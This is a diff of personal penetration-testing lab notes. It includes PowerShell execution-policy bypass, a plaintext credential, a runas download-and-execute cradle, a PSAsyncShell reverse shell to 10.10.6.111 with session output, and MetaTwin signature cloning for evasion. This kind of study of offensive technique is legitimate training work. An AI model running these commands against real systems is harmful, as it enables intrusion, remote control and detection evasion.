@@ -278,7 +278,7 @@ anotherone - this works
 $secpasswd = ConvertTo-SecureString "WinR3d@" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("WIN10RED", $secpasswd)
 $computer = "DESKTOP-ATB3U19"
-[System.Diagnostics.Process]::Start("powershell -ep bypass -file C:\Users\m\new.ps1","", $mycreds.Username, $mycreds.Password, $computer)
+[System.Diagnostics.Process]::Start("calc.exe","", $mycreds.Username, $mycreds.Password, $computer)
 ```
 
 ```
@@ -309,5 +309,54 @@ runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.we
 ```
 Invoke-Command -ScriptBlock <COMMAND> -ComputerName <COMPUTER> -credential <USERNAME>
 ```
+
+works 
+```
+powershell -ep bypass -file .\new1.ps1
+```
+
+but this doesn't
+```
+runas /user:HP "PowerShell -ep bypass -File .\new1.ps1"
+```
+# plan 2 getting a reverse shell back
+
+```
+C:\Users\HP\Documents\pen300\crtp_ref>powershell -ep bypass .\async.ps1 -s -p 40022
+
+  ____  ____    _                         ____  _          _ _
+ |  _ \/ ___|  / \   ___ _   _ _ __   ___/ ___|| |__   ___| | |
+ | |_) \___ \ / _ \ / __| | | | '_ \ / __\___ \| '_ \ / _ \ | |
+ |  __/ ___) / ___ \\__ \ |_| | | | | (__ ___) | | | |  __/ | |
+ |_|   |____/_/   \_\___/\__, |_| |_|\___|____/|_| |_|\___|_|_|
+                         |___/
+
+  ---------------------- by @JoelGMSec -----------------------
+
+[+] Waiting for new connection..
+
+[PSAsyncShell] C:\Users\HP\Documents\pen300\crtp_ref> whoami
+winwork\hp
+
+[PSAsyncShell] C:\Users\HP\Documents\pen300\crtp_ref> exit
+[!] Exiting!
+```
+
+from https://github.com/JoelGMSec/PSAsyncShell/blob/main/PSAsyncShell.ps1
+
+```
+C:\Users\HP\Documents\pen300\crtp_ref>powershell -ep bypass .\async.ps1 -c 10.10.6.111 40022
+```
+metatwin
+
+`https://github.com/threatexpress/metatwin/blob/master/metatwin.ps1`
+
+`Invoke-MetaTwin [-Source] <Object> [-Target] <Object> [-Sign] `
+
+async reverse shell
+
+`https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell` - not working
+
+
 
 
